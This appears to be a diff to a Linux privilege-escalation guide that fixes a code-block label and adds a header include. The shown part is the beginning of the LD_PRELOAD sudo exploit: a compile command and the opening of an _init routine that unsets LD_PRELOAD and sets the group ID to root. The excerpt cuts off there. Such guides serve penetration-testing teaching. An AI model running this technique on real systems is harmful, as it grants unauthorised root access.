@@ -442,10 +442,11 @@ Defaults        env_keep += LD_PRELOAD
 
 Compile the following shared object using the C code below with `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`
 
-```powershell
+```c
 #include <stdio.h>
 #include <sys/types.h>
 #include <stdlib.h>
+#include <unistd.h>
 void _init() {
 	unsetenv("LD_PRELOAD");
 	setgid(0);
